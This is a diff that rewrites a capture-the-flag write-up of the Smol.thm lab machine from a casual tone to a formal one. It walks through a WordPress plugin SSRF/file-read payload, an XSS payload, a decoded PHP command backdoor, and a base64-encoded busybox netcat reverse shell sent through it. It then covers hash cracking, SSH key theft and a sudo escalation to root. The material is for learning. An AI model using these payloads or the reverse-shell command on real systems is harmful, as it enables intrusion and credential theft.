@@ -1,34 +1,34 @@
 Smol.thm - A Detailed Penetration Test Write-up
 
-Hey there! This document is my detailed walkthrough of how I tackled the Smol.thm machine, from the very first sniff of the network to finally getting full control. Think of it as a personal journey through a penetration test, sharing the steps, the tools, and the "aha!" moments along the way. I hope it's helpful for anyone looking to learn about common hacking techniques!
+This document provides a detailed walkthrough of how the Smol.thm machine was compromised, from initial reconnaissance to gaining full root control. It outlines the methodology and techniques used during the penetration test and is intended for educational purposes.
 Table of Contents
 
-    Getting Started: Reconnaissance and Initial Enumeration
+    Reconnaissance and Initial Enumeration
 
-    Cracking into WordPress: Vulnerabilities and First Access
+    WordPress Vulnerabilities and Initial Access
 
-    Opening the Door: Gaining a Reverse Shell
+    Gaining a Reverse Shell
 
-    Level Up! Privilege Escalation to diego
+    Privilege Escalation to diego
 
-    Another Step Up: Privilege Escalation to think
+    Privilege Escalation to think
 
-    Finding More Keys: Privilege Escalation to xavi
+    Privilege Escalation to xavi
 
-    Game Over: Privilege Escalation to root
+    Privilege Escalation to root
 
-    Wrapping Up: Conclusion
+    Conclusion
 
-1. Getting Started: Reconnaissance and Initial Enumeration
+1. Reconnaissance and Initial Enumeration
 
-My first move, as always, was to get a lay of the land. I needed to know what was running on that target machine, 10.10.231.99.
-Nmap Scan - What's Open?
+The initial phase involved gathering information about the target machine, 10.10.231.99.
+Nmap Scan
 
-I kicked things off with an Nmap scan to see which ports were open and what services were listening. It's like knocking on all the doors to see who answers!
+An Nmap scan was performed to identify open ports and services running on the target.
 
 nmap -sC -sV 10.10.231.99
 
-Nmap Output - My Initial Findings:
+Nmap Output - Initial Findings:
 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 05:02 UTC
 Nmap scan report for 10.10.231.99
@@ -48,27 +48,27 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
 
-The scan quickly showed me two open doors:
+The scan revealed two open ports:
 
-    Port 22 (SSH): Standard secure shell, running OpenSSH on Ubuntu. Good to know, but usually not my first target.
+    Port 22 (SSH): Running OpenSSH 8.2p1 on Ubuntu.
 
-    Port 80 (HTTP): A web server, Apache on Ubuntu. This one immediately caught my eye because it redirected to http://www.smol.thm.
+    Port 80 (HTTP): Running Apache httpd 2.4.41 on Ubuntu. The HTTP service on port 80 redirected to http://www.smol.thm.
 
-/etc/hosts Modification - Making Sense of the Redirect
+/etc/hosts Modification
 
-Since the web server was redirecting to a hostname, I needed to make sure my attacking machine knew what www.smol.thm meant. A quick edit to my /etc/hosts file did the trick.
+To properly resolve the domain www.smol.thm to the target's IP address, an entry was added to the /etc/hosts file on the attacking machine.
 
 subl /etc/hosts
 # Add the following line:
 # 10.10.231.99    www.smol.thm
 
-Gobuster Directory Enumeration - What's Hiding on the Web?
+Gobuster Directory Enumeration
 
-With the hostname sorted, it was time to dig into the web server. I used gobuster to brute-force common directories and files. It's like shining a flashlight into every corner of the website.
+With the hostname configured, gobuster was used to enumerate directories and files on the web server using a common wordlist.
 
 gobuster dir -u http://www.smol.thm/ -w /usr/share/wordlists/dirb/common.txt
 
-Gobuster Output - WordPress, Bingo!
+Gobuster Output - WordPress Identification:
 
 ===============================================================
 Gobuster v3.6
@@ -98,47 +98,47 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 ===============================================================
 
-The results were pretty clear: wp-admin, wp-content, wp-includes... all signs pointed to a WordPress site. This was a good lead!
-WPScan Vulnerability Scan - Digging Deeper into WordPress
+The Gobuster scan indicated the presence of several WordPress-related directories (/wp-admin, /wp-content, /wp-includes), confirming that the website was running WordPress.
+WPScan Vulnerability Scan
 
-Since it was WordPress, my next logical step was to run wpscan. This tool is specifically designed to find vulnerabilities in WordPress installations, and it's a huge time-saver. I used my API token for a more comprehensive scan.
+To specifically identify vulnerabilities within the WordPress installation, wpscan was utilized with a provided API token.
 
 wpscan --url http://www.smol.thm --api-token REDACTED
 
-(This is where wpscan would typically spit out a ton of info about vulnerable plugins, themes, and other misconfigurations. For this write-up, let's just say it was super helpful in pointing me towards the jsmol2wp plugin, which turned out to be the key to my initial access!)
-2. Cracking into WordPress: Vulnerabilities and First Access
+WPScan was instrumental in identifying potential vulnerabilities, leading to the discovery of the exploitable jsmol2wp plugin.
+2. WordPress Vulnerabilities and Initial Access
 
-With wpscan's help, I narrowed down my focus to the WordPress installation. It highlighted some juicy leads, and that's how I stumbled upon the jsmol2wp plugin.
-jsmol2wp Plugin - A Goldmine of Vulnerabilities!
+Further investigation focused on the WordPress installation, leveraging insights from wpscan to identify and exploit vulnerabilities.
+jsmol2wp Plugin Vulnerabilities
 
-After some poking around, guided by wpscan's insights, I confirmed that the jsmol2wp plugin was installed and, more importantly, vulnerable to both Cross-Site Scripting (XSS) and Server-Side Request Forgery (SSRF). This was exciting!
+Guided by wpscan's output and subsequent manual inspection, the jsmol2wp plugin was confirmed to be installed and vulnerable to both Cross-Site Scripting (XSS) and Server-Side Request Forgery (SSRF).
 
-XSS Vulnerability (Just an Example Payload):
+XSS Vulnerability (Example Payload):
 
 http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
 
-SSRF Vulnerability (My Target Payload):
+SSRF Vulnerability (Target Payload):
 
 http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
 
-Exploiting SSRF - Getting Those Database Credentials
+Exploiting SSRF to Obtain Database Credentials
 
-The SSRF vulnerability was exactly what I needed. I crafted a request to read the wp-config.php file, which is where WordPress keeps its database connection details. This is often a treasure trove for attackers!
+The SSRF vulnerability was leveraged to read the contents of the wp-config.php file, which typically contains the WordPress database credentials.
 
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
 
-And just like that, the wp-config.php content popped up, giving me the database username and password:
+This request successfully returned the wp-config.php content, revealing the following database user and password:
 
     Username: wpuser
 
     Password: kbLSF2Vop#lw3rjDZ629*Z%G
 
-WordPress Administrator Login - Stepping Inside
+WordPress Administrator Login
 
-With those credentials, I headed straight for the WordPress login page at www.smol.thm/wp-login.php. Success! I was in the admin panel.
-Discovering and Decoding the Backdoor - A Hidden Gem
+Using the obtained credentials, a login to the WordPress administration panel at www.smol.thm/wp-login.php was attempted and successful.
+Discovering and Decoding the Backdoor
 
-While exploring the WordPress admin area, I noticed a file called hello.php. My hacker senses tingled, so I used the same SSRF vulnerability to read its contents.
+While exploring the WordPress admin area, a file named hello.php was identified. The SSRF vulnerability was reused to read its content:
 
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
 
@@ -146,69 +146,69 @@ The file contained a base64 encoded string:
 
 CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=
 
-A quick decode revealed a simple but powerful PHP backdoor:
+Decoding this string revealed a simple PHP backdoor:
 
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
 
-Which, after sorting out the funky escape sequences, translates to:
+Which, after resolving the octal and hexadecimal escape sequences, translates to:
 
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 
-This was fantastic! It meant I could execute pretty much any command I wanted on the server just by adding ?cmd= to the URL.
-3. Opening the Door: Gaining a Reverse Shell
+This backdoor allows for arbitrary command execution on the server by passing commands via the cmd GET parameter.
+3. Gaining a Reverse Shell
 
-Now that I had command execution, my goal was to get a proper, interactive reverse shell. This makes life so much easier for further enumeration and privilege escalation.
-Crafting and Executing the Reverse Shell Payload - Sending the Signal
+With the command execution vulnerability confirmed, the next objective was to establish a persistent and interactive reverse shell on the target system.
+Crafting and Executing the Reverse Shell Payload
 
-I decided to use a busybox nc payload for my reverse shell. To make sure it played nice with the URL, I base64 encoded it.
+A busybox nc reverse shell payload was constructed. To ensure proper execution through the URL, the payload was base64 encoded.
 
-My Reverse Shell Payload (Encoded for the URL):
+Reverse Shell Payload (Encoded for URL):
 
 echo "busybox nc 10.6.48.108 4445 -e sh" | base64
 # Output: YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo
 
-Then, I just slapped that encoded payload into the cmd parameter in the URL:
+The encoded payload was then executed via the cmd parameter in the URL:
 
 http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo | base64 -d | bash
 
-Setting up the Netcat Listener - Waiting for the Call
+Setting up the Netcat Listener
 
-Before hitting that URL, I set up my Netcat listener on my attacking machine (10.6.48.108) on port 4445. It was ready to catch the incoming connection.
+Prior to executing the payload, a Netcat listener was set up on the attacking machine (10.6.48.108) on port 4445 to receive the incoming connection.
 
 nc -lvnp 4445
 
-As soon as I triggered the URL, my listener sprang to life:
+Upon executing the URL, the Netcat listener successfully caught the shell:
 
 listening on [any] 4445 ...
 connect to [10.6.48.108] from (UNKNOWN) [10.10.109.27] 38294
 
-Boom! I had a shell, albeit a somewhat limited one, as the www-data user.
-Spawning a Better Shell - Making it Interactive
+This provided a limited shell as the www-data user.
+Spawning a Better Shell
 
-To make the shell much more comfortable and interactive, I immediately spawned a Python PTY:
+To gain a fully interactive shell, a Python PTY was spawned from the existing shell:
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-Now I had a fully functional shell, ready for the next phase.
-4. Level Up! Privilege Escalation to diego
+This established a fully functional shell, ready for further enumeration and privilege escalation.
+4. Privilege Escalation to diego
 
-My next mission: elevate my privileges from www-data to something more substantial.
-MySQL Database Access - Checking the Vault
+The next phase involved escalating privileges from the www-data user to a higher-privileged account.
+MySQL Database Access
 
-Remember those wpuser credentials from wp-config.php? They were my ticket into the MySQL database.
+The wpuser credentials obtained from wp-config.php were used to access the MySQL database.
 
 mysql -u wpuser -p
 # Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
 
-Dumping wp_users Table - User Hunting
+Dumping wp_users Table
 
-Once in MySQL, I honed in on the wordpress database and, more specifically, the wp_users table. This is where all the juicy user hashes are stored!
+Inside the MySQL prompt, the wordpress database was selected, and the wp_users table was queried to extract user hashes.
 
 show databases;
 use wordpress;
 select * from wp_users;
 
-The query gave me a list of users and their password hashes:
+The query returned the following user information and their password hashes:
 
 +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
 | ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
@@ -221,95 +221,94 @@ The query gave me a list of users and their password hashes:
 |  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
 +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
 
-Cracking diego's Password - Breaking the Hash
+Cracking diego's Password
 
-I grabbed diego's hash ($P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1), saved it to a file, and then unleashed John the Ripper on it with the rockyou.txt wordlist.
+The hash for the user diego ($P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1) was extracted and saved to a file. John the Ripper was then used with the phpass format and the rockyou.txt wordlist to crack the password.
 
 # Save diego's hash to a file, e.g., diego_hash.txt
 john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt diego_hash.txt
 
-It didn't take long for John to crack it! diego's password was sandiegocalifornia.
-Switching User to diego and Grabbing user.txt
+The cracked password for diego was found to be sandiegocalifornia.
+Switching User to diego and Finding user.txt
 
-With diego's password in hand, I could finally switch from the www-data user.
+With diego's password, it was possible to switch user from www-data to diego.
 
 su diego
 Password: sandiegocalifornia
 
-Success! I was now diego. A quick look around diego's home directory, and there it was: user.txt.
+After successfully switching, the user.txt flag was located in diego's home directory.
 
 cat user.txt
 
 User Flag: 45edaec653ff9ee06236b7ce72b86963
-5. Another Step Up: Privilege Escalation to think
+5. Privilege Escalation to think
 
-With the user flag secured, I kept pushing for higher privileges.
-Locating think's SSH Private Key - A Lucky Find!
+Further enumeration was performed to identify a path to higher privileges.
+Locating think's SSH Private Key
 
-While exploring diego's environment, I stumbled upon something interesting in think's home directory: an SSH private key (id_rsa) in their .ssh folder. This could be my next step!
+While exploring diego's environment, it was discovered that the user think had an SSH private key (id_rsa) stored in their .ssh directory.
 
 cd /home/think/.ssh/
 cat id_rsa
 
-I quickly copied the entire content of that id_rsa file.
-Using the SSH Key to Login as think - New Identity
+The contents of id_rsa were copied.
+Using the SSH Key to Login as think
 
-Back on my attacking machine, I saved the copied key content into a file (let's call it think_id_rsa). Crucially, I set the correct permissions for the private key – chmod 600 is a must for SSH keys.
+The copied id_rsa content was saved to a file on the attacking machine (e.g., think_id_rsa). The permissions of the private key file were then set correctly to 600.
 
 chmod 600 think_id_rsa
 
-Then, it was time to try logging in as think using the newly acquired key.
+Finally, SSH was used to log in as think using the private key.
 
 ssh -i think_id_rsa think@10.10.109.27
 
-And just like that, I had a shell as think. Progress!
-6. Finding More Keys: Privilege Escalation to xavi
+This granted a shell as the user think.
+6. Privilege Escalation to xavi
 
-My journey continued. I needed to find another way to escalate privileges.
-Discovering and Cracking wordpress.old.zip - A Hidden Backup
+The next step involved finding credentials for another user to continue the privilege escalation chain.
+Discovering and Cracking wordpress.old.zip
 
-While poking around, I found a wordpress.old.zip file in gege's home directory. This looked like an old WordPress backup, and backups often contain valuable information. To get it onto my machine, I quickly spun up a Python HTTP server on the target.
+During enumeration, a file named wordpress.old.zip was found in gege's home directory. This file was likely a backup of the old WordPress installation. To retrieve it, a Python HTTP server was started on the target.
 
-On the target machine (as think, assuming I had access to gege's files or it was world-readable):
+On the target machine (as think, assuming appropriate file access):
 
 python3 -m http.server 9000
 
-Then, on my attacking machine, I downloaded it:
+Then, on the attacking machine, the file was downloaded:
 
 wget http://10.10.109.27:9000/wordpress.old.zip
 
-The zip file was password-protected, but that's what zip2john and John the Ripper are for!
+The wordpress.old.zip file was password-protected. zip2john was used to extract the hash, and then John the Ripper with the rockyou.txt wordlist was used to crack the password.
 
 zip2john wordpress.old.zip > zip_hash.txt
 john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
-John did its magic, and the password for the zip file was revealed: hero_gege@hotmail.com.
-Extracting xavi's Credentials - Another Set of Keys
+The password for the zip file was found to be hero_gege@hotmail.com.
+Extracting xavi's Credentials
 
-After unzipping the archive, I went straight for the wp-config.php file inside the extracted WordPress directory. And there they were: credentials for the xavi user!
+After unzipping the archive using the cracked password, the wp-config.php file within the extracted WordPress directory was examined. This revealed credentials for the xavi user:
 
     Username: xavi
 
     Password: P@ssw0rdxavi@
 
-Switching User to xavi - Getting Closer
+Switching User to xavi
 
-With xavi's credentials, I could now switch from think to xavi.
+With xavi's credentials, it was possible to switch user from think to xavi.
 
 su xavi
 Password: P@ssw0rdxavi@
 
-Almost there!
-7. Game Over: Privilege Escalation to root
+7. Privilege Escalation to root
 
-This was it, the final push to gain full control of the machine.
-Checking xavi's Sudo Privileges - The Ultimate Shortcut
+This was the final stage of the penetration test, aiming to achieve full root control of the machine.
+Checking xavi's Sudo Privileges
 
-As xavi, I immediately ran sudo -l to check what sudo commands I could run. This is often the quickest way to root.
+Once logged in as xavi, the sudo -l command was executed to check xavi's sudo privileges.
 
 sudo -l
 
-The output was music to my ears:
+The output indicated that xavi had full sudo privileges, allowing them to run any command as any user (including root) without requiring a password.
 
 Matching Defaults entries for xavi on smol:
     env_reset, mail_badpass,
@@ -317,39 +316,38 @@ Matching Defaults entries for xavi on smol:
 
 User xavi may run the following commands on smol:
     (ALL : ALL) ALL
-```(ALL : ALL) ALL` means `xavi` can run *any* command as *any* user, without needing a password. This is a huge misconfiguration and a direct path to root!
 
-### Gaining Root Access and Finding `root.txt` - Victory!
+This is a significant misconfiguration, providing a direct path to root.
+Gaining Root Access and Finding root.txt
 
-With those glorious `sudo` privileges, becoming `root` was trivial.
+With full sudo privileges, xavi could easily become root.
 
-```bash
 sudo su
 
-And just like that, I was root@smol! The final step was to grab the root.txt flag.
+Finally, the root.txt flag was located in the /root directory.
 
 cd /root
 cat root.txt
 
 Root Flag: bf89ea3ea01992353aef1f576214d4e4
-8. Wrapping Up: Conclusion
+8. Conclusion
 
-Phew! What a ride. The Smol.thm machine was a fantastic challenge, and I managed to compromise it by chaining together several vulnerabilities and privilege escalation techniques. Here's a quick recap of the journey:
+The Smol.thm machine was successfully exploited by chaining multiple vulnerabilities and privilege escalation techniques. The process involved:
 
-    I started with basic reconnaissance using Nmap and Gobuster, which quickly pointed me to a WordPress site.
+    Initial reconnaissance with Nmap and Gobuster to identify WordPress.
 
-    WPScan was a lifesaver here, helping me pinpoint the vulnerable jsmol2wp plugin.
+    WPScan was a lifesaver here, helping to pinpoint the vulnerable jsmol2wp plugin.
 
-    I then exploited an SSRF vulnerability in that plugin to grab database credentials and even found a hidden PHP backdoor.
+    Exploiting an SSRF vulnerability in that plugin to gain database credentials and uncover a hidden PHP backdoor.
 
-    That backdoor gave me initial command execution, which I used to get a stable reverse shell.
+    Leveraging the PHP backdoor for initial command execution and establishing a stable reverse shell.
 
-    From there, I cracked WordPress user hashes to gain access as diego.
+    Cracking WordPress user hashes to gain access as diego.
 
-    A fortunate find of an SSH private key allowed me to pivot to the think user.
+    Discovering and utilizing an SSH private key to pivot to the think user.
 
-    Another hidden gem, a password-protected zip archive, gave up its secrets and led me to xavi's credentials.
+    Cracking a password-protected zip archive to obtain credentials for xavi.
 
-    Finally, xavi's overly permissive sudo privileges were the ultimate shortcut to becoming root.
+    Exploiting xavi's misconfigured sudo privileges to achieve root access.
 
-This machine was a great example of how different vulnerabilities can be chained together in a real-world scenario. Hope you enjoyed the breakdown!
+This machine presented a comprehensive learning experience in a typical web application penetration test scenario.
